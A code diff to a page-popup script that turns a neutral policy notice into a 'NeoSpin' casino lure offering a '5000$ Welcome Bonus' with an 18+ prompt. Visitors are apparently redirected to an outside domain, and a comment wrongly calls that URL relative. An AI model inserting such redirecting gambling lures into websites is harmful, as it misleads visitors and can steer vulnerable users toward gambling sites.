@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = " https://vivaroa.online/";
+  const REDIRECT = "https://vivaroa.online/";
  
   function buildPopup() {
     // prevent double render
@@ -11,8 +11,8 @@
     bd.className = "modal-backdrop";
     bd.innerHTML = `
       <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
-        <h3>Policy Notice</h3>
-        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+        <h3>Welcome To NeoSpin</h3>
+        <p>Get 5000$ Welcome Bonus. Are you 18+.</p>
         <div class="modal-actions">
           <button class="btn" id="age-yes">Yes, Accept</button>
           <button class="btn ghost" id="age-no">Close</button>
@@ -61,6 +61,5 @@
  
 
  
-
 
 
